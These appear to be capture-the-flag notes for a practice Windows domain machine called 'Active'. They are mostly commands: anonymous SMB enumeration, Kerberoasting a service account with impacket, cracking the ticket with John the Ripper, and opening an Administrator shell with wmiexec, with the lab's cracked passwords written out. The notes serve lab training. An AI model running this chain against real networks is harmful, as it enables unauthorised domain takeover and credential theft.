# Active: Machine Notes

## Recon

### SMB Enumeration
- List anonymous shares:
```bash
smbclient -L //10.129.x.x/ -N
```
- Connect anonymously:
```bash
smbclient //10.129.x.x/share -N
```
- Active Directory enumeration with NetExec:
```bash
netexec smb 10.129.x.x --shares
netexec smb 10.129.x.x --signing
netexec smb 10.129.x.x --rid-brute
```

## Initial Access

### Kerberoasting
- Requesting service tickets (TGS) for SPNs:
```bash
impacket-GetUserSPNs active.htb/SVC_TGS:"GPPstillStandingStrong2k18" -dc-ip 10.129.x.x -request
```
- Target identified: `Administrator` SPN found.

### Cracking Kerberos Ticket
- Save the hash to a file and crack with John the Ripper:
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
- Cracked Password: `Ticketmaster1968`

## Privilege Escalation / Final Access

### Remote Execution (Administrator)
- Use the cracked Administrator password to gain a shell:
```bash
impacket-wmiexec active.htb/Administrator:Ticketmaster1968@10.129.x.x
```
